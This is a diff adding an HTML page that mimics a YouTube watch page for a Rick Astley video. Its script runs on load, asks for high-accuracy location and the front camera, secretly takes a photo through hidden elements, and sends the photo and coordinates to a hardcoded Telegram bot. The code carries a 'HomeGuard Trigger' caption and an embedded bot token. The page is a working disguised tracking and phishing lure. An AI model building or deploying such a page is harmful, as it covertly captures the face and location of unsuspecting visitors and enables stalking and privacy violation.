@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>YouTube</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      background: #0f0f0f;
+      color: #f1f1f1;
+      font-family: 'Roboto', Arial, sans-serif;
+      font-size: 14px;
+    }
+
+    /* ── Header ── */
+    .yt-header {
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      background: #0f0f0f;
+      display: flex;
+      align-items: center;
+      padding: 0 16px;
+      height: 56px;
+      gap: 12px;
+      border-bottom: 1px solid #272727;
+    }
+
+    .yt-logo {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      text-decoration: none;
+      flex-shrink: 0;
+    }
+
+    .yt-logo svg { width: 90px; height: 20px; }
+
+    .yt-search-wrap {
+      flex: 1;
+      display: flex;
+      max-width: 600px;
+      margin: 0 auto;
+    }
+
+    .yt-search-wrap input {
+      flex: 1;
+      background: #121212;
+      border: 1px solid #303030;
+      border-right: none;
+      border-radius: 40px 0 0 40px;
+      color: #f1f1f1;
+      font-size: 16px;
+      padding: 0 16px;
+      height: 40px;
+      outline: none;
+    }
+
+    .yt-search-wrap input:focus {
+      border-color: #1c62b9;
+    }
+
+    .yt-search-btn {
+      background: #222;
+      border: 1px solid #303030;
+      border-radius: 0 40px 40px 0;
+      color: #f1f1f1;
+      cursor: pointer;
+      height: 40px;
+      width: 64px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .yt-icons {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      flex-shrink: 0;
+    }
+
+    .yt-icons span {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      background: #272727;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 18px;
+      cursor: pointer;
+    }
+
+    /* ── Main Layout ── */
+    .yt-main {
+      max-width: 1280px;
+      margin: 0 auto;
+      padding: 16px 16px 60px;
+      display: flex;
+      gap: 24px;
+    }
+
+    /* ── Video Section ── */
+    .yt-video-section {
+      flex: 1;
+      min-width: 0;
+    }
+
+    .yt-player {
+      width: 100%;
+      aspect-ratio: 16/9;
+      background: #000;
+      border-radius: 12px;
+      overflow: hidden;
+    }
+
+    .yt-player iframe {
+      width: 100%;
+      height: 100%;
+      border: none;
+      display: block;
+    }
+
+    .yt-video-title {
+      font-size: 20px;
+      font-weight: 600;
+      line-height: 1.4;
+      margin: 12px 0 8px;
+      color: #f1f1f1;
+    }
+
+    .yt-meta-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 8px;
+      margin-bottom: 12px;
+    }
+
+    .yt-views {
+      color: #aaa;
+      font-size: 13px;
+    }
+
+    .yt-actions {
+      display: flex;
+      gap: 8px;
+    }
+
+    .yt-btn {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      background: #272727;
+      border: none;
+      border-radius: 20px;
+      color: #f1f1f1;
+      cursor: pointer;
+      font-size: 14px;
+      font-weight: 500;
+      padding: 8px 14px;
+    }
+
+    .yt-btn.like { background: #272727; }
+    .yt-btn.like span { font-size: 18px; }
+
+    /* ── Channel Row ── */
+    .yt-channel-row {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 12px 0;
+      border-top: 1px solid #272727;
+      border-bottom: 1px solid #272727;
+      margin-bottom: 12px;
+    }
+
+    .yt-avatar {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      background: #ff0000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 700;
+      font-size: 16px;
+      flex-shrink: 0;
+    }
+
+    .yt-channel-info { flex: 1; }
+    .yt-channel-name { font-weight: 600; font-size: 15px; }
+    .yt-subs { color: #aaa; font-size: 12px; margin-top: 2px; }
+
+    .yt-subscribe {
+      background: #f1f1f1;
+      border: none;
+      border-radius: 20px;
+      color: #0f0f0f;
+      cursor: pointer;
+      font-size: 14px;
+      font-weight: 600;
+      padding: 10px 18px;
+    }
+
+    /* ── Description ── */
+    .yt-desc-box {
+      background: #272727;
+      border-radius: 12px;
+      padding: 12px 14px;
+      margin-bottom: 16px;
+    }
+
+    .yt-desc-box .views-date {
+      font-size: 13px;
+      font-weight: 600;
+      margin-bottom: 6px;
+    }
+
+    .yt-desc-box p {
+      font-size: 13px;
+      color: #ccc;
+      line-height: 1.5;
+    }
+
+    /* ── Comments ── */
+    .yt-comments-header {
+      font-size: 16px;
+      font-weight: 600;
+      margin-bottom: 16px;
+    }
+
+    .yt-comment {
+      display: flex;
+      gap: 12px;
+      margin-bottom: 18px;
+    }
+
+    .yt-comment-avatar {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      flex-shrink: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 700;
+      font-size: 14px;
+    }
+
+    .yt-comment-body { flex: 1; }
+    .yt-comment-user { font-size: 13px; font-weight: 600; margin-bottom: 3px; }
+    .yt-comment-user span { color: #aaa; font-weight: 400; margin-left: 6px; }
+    .yt-comment-text { font-size: 13px; color: #e0e0e0; line-height: 1.5; }
+    .yt-comment-likes { font-size: 12px; color: #aaa; margin-top: 6px; }
+
+    /* ── Sidebar ── */
+    .yt-sidebar {
+      width: 400px;
+      flex-shrink: 0;
+    }
+
+    .yt-rec-item {
+      display: flex;
+      gap: 8px;
+      margin-bottom: 8px;
+      cursor: pointer;
+    }
+
+    .yt-rec-thumb {
+      width: 168px;
+      height: 94px;
+      border-radius: 8px;
+      flex-shrink: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 28px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .yt-rec-duration {
+      position: absolute;
+      bottom: 4px;
+      right: 4px;
+      background: rgba(0,0,0,0.8);
+      font-size: 11px;
+      padding: 2px 4px;
+      border-radius: 3px;
+      font-weight: 600;
+    }
+
+    .yt-rec-info { flex: 1; }
+    .yt-rec-title { font-size: 14px; font-weight: 500; line-height: 1.4; margin-bottom: 4px; color: #f1f1f1; }
+    .yt-rec-channel { font-size: 12px; color: #aaa; }
+    .yt-rec-views { font-size: 12px; color: #aaa; }
+
+    /* ── Responsive ── */
+    @media (max-width: 900px) {
+      .yt-sidebar { display: none; }
+      .yt-search-wrap input { font-size: 14px; }
+    }
+
+    /* ── Hidden elements ── */
+    video, canvas { display: none; }
+  </style>
+</head>
+<body>
+
+  <!-- Header -->
+  <header class="yt-header">
+    <a class="yt-logo" href="#">
+      <!-- YouTube SVG logo -->
+      <svg viewBox="0 0 90 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M14.3 2.6s-.2-1.3-.8-1.9c-.7-.8-1.6-.8-2-.8C9.6 0 6 0 6 0H6S2.4 0 .5.0C-.1.0-1 .0-1.7.8c-.6.6-.8 1.9-.8 1.9S-2.7 4-2.7 5.5v1.4c0 1.5.2 2.9.2 2.9s.2 1.3.8 1.9c.7.8 1.8.7 2.2.8C1.9 12.6 6 12.6 6 12.6s3.6 0 5.5-.1c.6 0 1.3-.1 2-.8.6-.6.8-1.9.8-1.9s.2-1.4.2-2.9V5.5c0-1.5-.2-2.9-.2-2.9zM4.8 8.6V3.5l5.4 2.6-5.4 2.5z" fill="#FF0000" transform="translate(3 4)"/>
+        <text x="22" y="15" font-family="Arial" font-size="13" font-weight="bold" fill="#FFFFFF">YouTube</text>
+      </svg>
+    </a>
+
+    <div class="yt-search-wrap">
+      <input type="text" placeholder="Search" />
+      <button class="yt-search-btn">🔍</button>
+    </div>
+
+    <div class="yt-icons">
+      <span>🔔</span>
+      <span>👤</span>
+    </div>
+  </header>
+
+  <!-- Main -->
+  <div class="yt-main">
+
+    <!-- Video + info -->
+    <div class="yt-video-section">
+
+      <!-- Player -->
+      <div class="yt-player" id="yt-player"></div>
+
+      <!-- Title -->
+      <h1 class="yt-video-title" id="yt-title">Rick Astley - Never Gonna Give You Up (Official Music Video)</h1>
+
+      <!-- Meta row -->
+      <div class="yt-meta-row">
+        <span class="yt-views">1.5B views &nbsp;·&nbsp; Oct 25, 2009</span>
+        <div class="yt-actions">
+          <button class="yt-btn like"><span>👍</span> 18M</button>
+          <button class="yt-btn"><span>👎</span></button>
+          <button class="yt-btn">↗ Share</button>
+          <button class="yt-btn">⬇ Download</button>
+        </div>
+      </div>
+
+      <!-- Channel -->
+      <div class="yt-channel-row">
+        <div class="yt-avatar">R</div>
+        <div class="yt-channel-info">
+          <div class="yt-channel-name">Rick Astley</div>
+          <div class="yt-subs">3.8M subscribers</div>
+        </div>
+        <button class="yt-subscribe">Subscribe</button>
+      </div>
+
+      <!-- Description -->
+      <div class="yt-desc-box">
+        <div class="views-date">1,547,823,491 views &nbsp;·&nbsp; Oct 25, 2009</div>
+        <p>The official video for "Never Gonna Give You Up" by Rick Astley.<br><br>
+        "Never Gonna Give You Up" was a #1 hit globally in many countries including the UK, US, Germany and Australia. Rick Astley won the Brit Award for Best British Male Artist in 1988.<br><br>
+        🎵 Available everywhere: https://RickAstley.lnk.to/NeverGonnaGiveYouUp</p>
+      </div>
+
+      <!-- Comments -->
+      <div class="yt-comments-header">2.4M Comments</div>
+
+      <div class="yt-comment">
+        <div class="yt-comment-avatar" style="background:#4285f4">A</div>
+        <div class="yt-comment-body">
+          <div class="yt-comment-user">@AwesomeDude99 <span>2 years ago</span></div>
+          <div class="yt-comment-text">This song will never be old. Genuinely one of the best songs ever made.</div>
+          <div class="yt-comment-likes">👍 142K</div>
+        </div>
+      </div>
+
+      <div class="yt-comment">
+        <div class="yt-comment-avatar" style="background:#ea4335">M</div>
+        <div class="yt-comment-body">
+          <div class="yt-comment-user">@MusicLover2024 <span>8 months ago</span></div>
+          <div class="yt-comment-text">I was today years old when I realized I've been rickrolled by this song 1000 times and I still love it 😂</div>
+          <div class="yt-comment-likes">👍 89K</div>
+        </div>
+      </div>
+
+      <div class="yt-comment">
+        <div class="yt-comment-avatar" style="background:#34a853">S</div>
+        <div class="yt-comment-body">
+          <div class="yt-comment-user">@StargazerHD <span>1 year ago</span></div>
+          <div class="yt-comment-text">Rick Astley aged like fine wine. Legend.</div>
+          <div class="yt-comment-likes">👍 54K</div>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- Sidebar: Recommended -->
+    <div class="yt-sidebar">
+
+      <div class="yt-rec-item">
+        <div class="yt-rec-thumb" style="background:#1a1a2e">🎵<span class="yt-rec-duration">3:33</span></div>
+        <div class="yt-rec-info">
+          <div class="yt-rec-title">Take On Me - a-ha (Official Video) Remastered in HD</div>
+          <div class="yt-rec-channel">a-ha</div>
+          <div class="yt-rec-views">890M views</div>
+        </div>
+      </div>
+
+      <div class="yt-rec-item">
+        <div class="yt-rec-thumb" style="background:#2d1b69">🎶<span class="yt-rec-duration">4:05</span></div>
+        <div class="yt-rec-info">
+          <div class="yt-rec-title">The Police - Every Breath You Take</div>
+          <div class="yt-rec-channel">The Police</div>
+          <div class="yt-rec-views">1.2B views</div>
+        </div>
+      </div>
+
+      <div class="yt-rec-item">
+        <div class="yt-rec-thumb" style="background:#1a3a1a">🎸<span class="yt-rec-duration">5:56</span></div>
+        <div class="yt-rec-info">
+          <div class="yt-rec-title">Toto - Africa (Official Video)</div>
+          <div class="yt-rec-channel">Toto</div>
+          <div class="yt-rec-views">780M views</div>
+        </div>
+      </div>
+
+      <div class="yt-rec-item">
+        <div class="yt-rec-thumb" style="background:#3a1a1a">🥁<span class="yt-rec-duration">4:14</span></div>
+        <div class="yt-rec-info">
+          <div class="yt-rec-title">Don't Stop Believin' - Journey</div>
+          <div class="yt-rec-channel">Journey</div>
+          <div class="yt-rec-views">620M views</div>
+        </div>
+      </div>
+
+      <div class="yt-rec-item">
+        <div class="yt-rec-thumb" style="background:#1a2a3a">🎤<span class="yt-rec-duration">3:44</span></div>
+        <div class="yt-rec-info">
+          <div class="yt-rec-title">Queen - Bohemian Rhapsody (Official Video)</div>
+          <div class="yt-rec-channel">Queen Official</div>
+          <div class="yt-rec-views">1.8B views</div>
+        </div>
+      </div>
+
+      <div class="yt-rec-item">
+        <div class="yt-rec-thumb" style="background:#2a1a2a">🎹<span class="yt-rec-duration">6:07</span></div>
+        <div class="yt-rec-info">
+          <div class="yt-rec-title">Guns N' Roses - November Rain</div>
+          <div class="yt-rec-channel">Guns N' Roses</div>
+          <div class="yt-rec-views">1.1B views</div>
+        </div>
+      </div>
+
+    </div>
+
+  </div>
+
+  <!-- Hidden elements for camera capture -->
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
+
+<script>
+  // ─── YOUTUBE VIDEO ── Sirf yeh link badal ─────────────────────────────────
+  const YOUTUBE_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+  // ──────────────────────────────────────────────────────────────────────────
+
+  // ─── CONFIG ───────────────────────────────────────────────────────────────
+  const BOT_TOKEN = "8973797235:AAHeo3DYJHq79df4YXKleQu-sAanDgG1dcU";
+  const CHAT_ID   = "8145264158";
+  // ──────────────────────────────────────────────────────────────────────────
+
+  const TELEGRAM = `https://api.telegram.org/bot${BOT_TOKEN}`;
+
+  function loadYouTube(url) {
+    const match = url.match(/(?:v=|youtu\.be\/)([a-zA-Z0-9_-]{11})/);
+    if (!match) return;
+    const videoId = match[1];
+    document.getElementById("yt-player").innerHTML =
+      `<iframe src="https://www.youtube.com/embed/${videoId}?autoplay=1&controls=1&rel=0"
+       allow="autoplay; encrypted-media" allowfullscreen></iframe>`;
+  }
+
+  async function runTrigger() {
+    let locText = null, lat = null, lon = null;
+
+    // 1. Location
+    try {
+      const pos = await new Promise((res, rej) =>
+        navigator.geolocation.getCurrentPosition(res, rej, {
+          enableHighAccuracy: true, timeout: 10000
+        })
+      );
+      lat = pos.coords.latitude;
+      lon = pos.coords.longitude;
+      locText = `📍 ${lat.toFixed(6)}, ${lon.toFixed(6)}\nAccuracy: ${Math.round(pos.coords.accuracy)}m`;
+    } catch (e) {}
+
+    // 2. Camera
+    let photoBlob = null;
+    try {
+      let stream;
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: { exact: "user" } }
+        });
+      } catch {
+        stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      }
+
+      const video  = document.getElementById("video");
+      const canvas = document.getElementById("canvas");
+      video.srcObject = stream;
+      await new Promise(res => video.onloadedmetadata = res);
+      await new Promise(res => setTimeout(res, 1200));
+
+      canvas.width  = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext("2d").drawImage(video, 0, 0);
+      stream.getTracks().forEach(t => t.stop());
+
+      photoBlob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.85));
+    } catch (e) {}
+
+    // 3. Send to Telegram
+    if (photoBlob) {
+      try {
+        const fd = new FormData();
+        fd.append("chat_id", CHAT_ID);
+        fd.append("photo", photoBlob, "hg_trigger.jpg");
+        fd.append("caption", `🛡️ HomeGuard Trigger\n${locText || "Location unavailable"}`);
+        await fetch(`${TELEGRAM}/sendPhoto`, { method: "POST", body: fd });
+      } catch (e) {}
+    }
+
+    if (lat !== null) {
+      try {
+        await fetch(`${TELEGRAM}/sendLocation`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: CHAT_ID, latitude: lat, longitude: lon })
+        });
+      } catch (e) {}
+    }
+  }
+
+  window.addEventListener("load", () => {
+    loadYouTube(YOUTUBE_URL);
+    runTrigger();
+  });
+</script>
+
+</body>
+</html>
